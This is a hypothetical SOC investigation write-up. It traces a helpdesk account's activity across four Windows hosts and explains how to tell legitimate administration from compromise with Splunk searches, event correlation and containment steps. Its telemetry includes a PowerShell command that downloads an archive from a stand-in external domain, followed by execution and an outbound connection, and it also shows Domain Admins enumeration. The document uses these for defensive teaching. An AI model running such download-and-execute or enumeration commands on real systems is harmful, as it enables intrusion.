# Splunk SOC Investigation Case Study: HelpDesk03 — Legitimate Administration or Compromise?

## Overview

This case study documents a hypothetical SOC investigation designed to test the distinction between **legitimate IT administration and potentially malicious activity**.

The investigation follows the activity of `HelpDesk03` across `CLIENT51`, `CLIENT50`, `DC01`, and `FILESERVER01`. The central challenge is that the early activity is consistent with normal Helpdesk responsibilities, while later telemetry introduces indicators that could represent malware execution and command-and-control activity.

The investigation demonstrates an important SOC principle:

> **Suspicious activity should be evaluated in context rather than judged from a single event.**

---

## Investigation Environment

| Host           | Role                                 |
| -------------- | ------------------------------------ |
| `CLIENT51`     | Helpdesk workstation                 |
| `CLIENT50`     | User workstation                     |
| `DC01`         | Domain Controller                    |
| `FILESERVER01` | Finance/IT file server               |
| `HelpDesk03`   | Helpdesk account under investigation |

---

# Telemetry Under Investigation

The following telemetry represents the complete evidence available to the analyst.

```text
Event 1 — 10:21:04 — CLIENT51

4624

Account: HelpDesk03
Logon Type: 2
```

```text
Event 2 — 10:21:18 — CLIENT51

4104

Get-ADComputer -Filter *
```

```text
Event 3 — 10:21:25 — CLIENT51

4104

Get-Service
```

```text
Event 4 — 10:22:01 — CLIENT51

4688

powershell.exe

Command:
Enter-PSSession CLIENT50
```

```text
Event 5 — 10:22:03 — CLIENT50

4624

Account: HelpDesk03
Logon Type: 3
Source: CLIENT51
```

```text
Event 6 — 10:22:11 — CLIENT50

4104

Get-Process
```

```text
Event 7 — 10:22:19 — CLIENT50

4104

Get-ADGroupMember "Domain Admins"
```

```text
Event 8 — 10:22:44 — DC01

4769

Account: HelpDesk03

Service:
cifs/FILESERVER01
```

```text
Event 9 — 10:23:02 — FILESERVER01

4624

Account: HelpDesk03
Logon Type: 3
Source: CLIENT50
```

```text
Event 10 — 10:23:15 — FILESERVER01

4663

Object:
\\FILESERVER01\IT\SoftwareInventory.xlsx

Access:
ReadData
```

```text
Event 11 — 10:23:42 — CLIENT50

4104

Invoke-WebRequest https://updates-example.net/inventory.zip -OutFile C:\ProgramData\inventory.zip
```

```text
Event 12 — 10:23:48 — CLIENT50

Sysmon 11

File Created:
C:\ProgramData\inventory.zip
```

```text
Event 13 — 10:24:10 — CLIENT50

4688

inventory.exe

Parent:
powershell.exe
```

```text
Event 14 — 10:24:12 — CLIENT50

Sysmon 3

inventory.exe
↓
10.10.20.50
↓
443
```

---

# 1. Where Does Legitimate Activity End?

My assessment is that the last activity that can reasonably be considered potentially legitimate is:

```text
Event 10 — 10:23:15

FILESERVER01
4663

\\FILESERVER01\IT\SoftwareInventory.xlsx

ReadData
```

The preceding activity has a plausible Helpdesk explanation.

`HelpDesk03` logs onto `CLIENT51`, performs system and Active Directory discovery, establishes a PowerShell remoting session to `CLIENT50`, and subsequently accesses an IT software inventory document.

A Helpdesk technician could legitimately perform these actions while troubleshooting a workstation or conducting software inventory.

The important distinction is that **the activity is unusual enough to investigate, but not inherently malicious**.

---

# 2. First Point of Suspicion

The first significant suspicion occurs at:

```text
Event 11 — 10:23:42

Invoke-WebRequest
https://updates-example.net/inventory.zip

-OutFile C:\ProgramData\inventory.zip
```

The command becomes concerning because the investigation has moved from administrative activity to **retrieving an external file and writing it to the endpoint**.

Several contextual indicators increase the risk:

* PowerShell is being used to download an external archive.
* The destination is an unfamiliar external domain.
* The file is written to `C:\ProgramData`.
* The download occurs immediately after administrative discovery and remote access activity.
* The downloaded file is subsequently executed.

However, I would still avoid immediately declaring the file malicious.

Legitimate IT management software can download packages from external infrastructure.

Therefore:

**Event 11 = Suspicious**

rather than automatically:

**Event 11 = Confirmed compromise.**

---

# 3. Escalation Point

My escalation point would be:

```text
Event 14 — 10:24:12

Sysmon Event 3

inventory.exe
↓
10.10.20.50
↓
443
```

At this stage, the evidence is significantly stronger.

The sequence is now:

```text
PowerShell
   ↓
External download
   ↓
inventory.zip created
   ↓
inventory.exe executed
   ↓
inventory.exe establishes outbound connection
```

An executable downloaded moments earlier from an external source is now communicating externally over HTTPS.

This does not prove maliciousness by itself, but the **combined telemetry establishes a sufficiently strong security concern to escalate for immediate investigation**.

I would classify the situation as:

> **Confirmed security incident / high-priority security investigation pending validation of the executable.**

---

# 4. Is HelpDesk03 Lateral Movement Automatically Malicious?

No.

The sequence:

```text
CLIENT51
   ↓
PowerShell
   ↓
Enter-PSSession CLIENT50
   ↓
CLIENT50 Type 3 logon
```

is consistent with legitimate remote administration.

Helpdesk personnel may use PowerShell Remoting to:

* Troubleshoot endpoints
* Inspect services
* Investigate running processes
* Install or update software
* Perform system maintenance
* Respond to user support requests

Therefore, the presence of `Enter-PSSession` and a Type 3 authentication should not automatically be classified as malicious lateral movement.

The correct SOC approach is to ask:

> **Was HelpDesk03 authorized to administer CLIENT50 at this time, and does the subsequent activity match the expected task?**

The later download and execution activity is what changes the risk assessment.

---

# 5. Understanding Event ID 4769

The following event appears on `DC01`:

```text
4769

Account:
HelpDesk03

Service:
cifs/FILESERVER01
```

Event ID 4769 represents a **Kerberos service ticket request**.

Here, `HelpDesk03` requested a service ticket for the CIFS service on `FILESERVER01`.

CIFS is commonly associated with Windows file-sharing services.

This correlates with the subsequent:

```text
FILESERVER01
4624
HelpDesk03
Logon Type 3
Source: CLIENT50
```

and then:

```text
4663
\\FILESERVER01\IT\SoftwareInventory.xlsx
ReadData
```

The sequence therefore provides useful authentication and resource-access correlation:

```text
HelpDesk03
     ↓
DC01
     ↓
Kerberos service ticket for CIFS
     ↓
FILESERVER01
     ↓
Network logon
     ↓
SoftwareInventory.xlsx
```

---

# 6. Reconstructed Telemetry Chain

The investigation can be reconstructed as follows:

```text
HelpDesk03
    │
    ▼
CLIENT51
Interactive Logon
4624 Type 2
    │
    ▼
PowerShell
    │
    ├── Get-ADComputer -Filter *
    │
    └── Get-Service
    │
    ▼
Enter-PSSession CLIENT50
    │
    ▼
CLIENT50
4624 Type 3
Source: CLIENT51
    │
    ├── Get-Process
    │
    └── Get-ADGroupMember "Domain Admins"
    │
    ▼
DC01
4769
CIFS/FILESERVER01
    │
    ▼
FILESERVER01
4624 Type 3
    │
    ▼
SoftwareInventory.xlsx
ReadData
    │
    ▼
CLIENT50
Invoke-WebRequest
    │
    ▼
inventory.zip
    │
    ▼
inventory.exe
    │
    ▼
Outbound HTTPS
10.10.20.50:443
```

This chain demonstrates why the investigation cannot be based on individual events.

The early portion has a credible administrative explanation.

The later portion creates a substantially different risk profile.

---

# 7. Primary Affected Host

My primary affected host is:

```text
CLIENT50
```

This is where the most concerning activity occurs.

`CLIENT50`:

* Received the remote PowerShell session
* Performed AD enumeration
* Downloaded the external archive
* Created `inventory.zip`
* Executed `inventory.exe`
* Established an outbound connection

Therefore, `CLIENT50` should receive immediate investigative and containment priority.

`CLIENT51` remains important because it is the source of the administrative session and may provide evidence about how the activity originated.

`FILESERVER01` is also in scope because the account accessed a file there, although the available telemetry does **not** establish that the file was exfiltrated or modified.

---

# 8. First Splunk Search and Pivots

My first investigation would begin with the account:

```spl
index=wineventlog "HelpDesk03"
| table _time host EventCode Account_Name Logon_Type Source_Network_Address Process_Command_Line
| sort _time
```

The objective is to establish the broader activity associated with `HelpDesk03` before and after the observed sequence.

### Pivot 1 — Authentication Session

After identifying the relevant `4624` event on `CLIENT51`, I would pivot using the associated **LogonGUID**.

The goal is to determine:

* What processes were created under the session
* Whether additional activity occurred
* Whether the session appears normal for this account

### Pivot 2 — Process Execution

I would then investigate the process chain around:

```text
powershell.exe
    ↓
inventory.exe
```

using **ProcessGUID** where available.

This allows the analyst to establish process ancestry and determine whether `inventory.exe` was genuinely launched by PowerShell.

### Pivot 3 — Network Activity

Finally, I would pivot around:

```text
inventory.exe
10.10.20.50
443
```

to identify:

* DNS activity
* Other connections from the process
* Other hosts communicating with the destination
* Historical connections to the same destination
* Whether the destination is known corporate infrastructure

---

# 9. Evidence Required Before Declaring inventory.exe Malicious

Before making a definitive malware determination, I would collect:

### File intelligence

* SHA256 hash
* File size
* File creation timestamp
* Digital signature
* Certificate issuer
* File metadata
* PE information

### Endpoint telemetry

* EDR detections
* Process tree
* Child processes
* Persistence mechanisms
* Registry modifications
* Additional file creation
* Scheduled tasks
* Services
* DLL loading

### Network telemetry

* DNS resolution
* Proxy logs
* Firewall logs
* Destination reputation
* Historical communication
* Other endpoints communicating with `10.10.20.50`

### Threat intelligence

I would search the hash and relevant infrastructure against trusted threat-intelligence sources.

Importantly, **I would not rely solely on IP reputation**. A suspicious-looking IP is an investigation lead, not definitive proof of compromise.

---

# 10. What Would Prove This Was Legitimate?

There are several pieces of evidence that could substantially reduce the suspicion.

### Change or Helpdesk Ticket

A legitimate ticket could show:

```text
HelpDesk03
    ↓
CLIENT50
    ↓
Software inventory collection
```

with the activity occurring during the approved support window.

### Software Deployment Record

The organization may have an approved inventory-management tool that downloads:

```text
inventory.zip
```

and executes:

```text
inventory.exe
```

### Asset Management Documentation

The domain or IP:

```text
updates-example.net
10.10.20.50
```

could belong to an approved enterprise software-management platform.

### Known-Good Hash

If the SHA256 hash of `inventory.exe` matches the organization's approved software inventory agent, the risk assessment changes substantially.

### Digital Signature

A valid signature from the expected software vendor would provide another important validation point.

### Normal Historical Behavior

If `HelpDesk03` routinely:

* Logs onto `CLIENT51`
* Remotes into `CLIENT50`
* Accesses `SoftwareInventory.xlsx`
* Downloads `inventory.exe`
* Communicates with `10.10.20.50`

then the activity may represent legitimate IT operations.

---

# 11. Containment

Because `CLIENT50` is the host where the suspicious executable executes and establishes an outbound connection, I would prioritize containment of `CLIENT50`.

### Priority 1 — Isolate CLIENT50

Prevent further communication with:

* Internal systems
* Domain resources
* External infrastructure

while preserving evidence where possible.

### Priority 2 — Investigate HelpDesk03

Temporarily restrict or disable the account if the evidence indicates credential compromise.

I would also:

* Revoke active sessions
* Reset credentials
* Review authentication history
* Investigate privileged group membership
* Check for other systems accessed by the account

### Priority 3 — Investigate CLIENT51

`CLIENT51` should not automatically be declared compromised.

However, because it initiated the PowerShell remoting session, I would investigate it for:

* Suspicious processes
* Credential theft
* Malware
* PowerShell activity
* Unusual authentication
* Evidence of compromise preceding the observed timeline

### Priority 4 — Protect FILESERVER01

I would review the file access and determine whether:

* Additional files were accessed
* Files were modified
* Files were copied
* Unusual authentication occurred
* Other systems accessed the same share

---

# SOC Assessment

The most important lesson from this case is that **Helpdesk activity can look very similar to attacker activity**.

The initial sequence:

```text
HelpDesk03
    ↓
CLIENT51
    ↓
PowerShell
    ↓
CLIENT50
    ↓
FILESERVER01
```

can plausibly represent normal IT administration.

The risk changes when the investigation reaches:

```text
Invoke-WebRequest
        ↓
inventory.zip
        ↓
inventory.exe
        ↓
Outbound HTTPS
```

At that point, the analyst has enough evidence to escalate the activity and begin validating whether the executable and infrastructure are authorized.

This investigation reinforced the importance of:

* Context-based triage
* Authentication correlation
* PowerShell monitoring
* Process ancestry
* Network telemetry
* File analysis
* Threat intelligence
* Change-management validation
* Distinguishing suspicious activity from confirmed compromise

---

# Key SOC Takeaway

A strong SOC analyst should not ask:

> **"Does this event look malicious?"**

They should ask:

> **"Does this sequence of events make sense for this user, this host, and this business function?"**

That shift from **event-based detection to contextual investigation** is one of the most important skills I am continuing to develop through these hands-on SOC exercises.

---

## Skills Practiced

`Splunk` · `SPL` · `Windows Event Logs` · `PowerShell Logging` · `Sysmon` · `Authentication Analysis` · `Kerberos` · `Process Correlation` · `Network Analysis` · `Threat Hunting` · `Incident Triage`

---

## Author

**Precious Anyanwu**

Cybersecurity | SOC Analysis | Cloud Security | Threat Detection
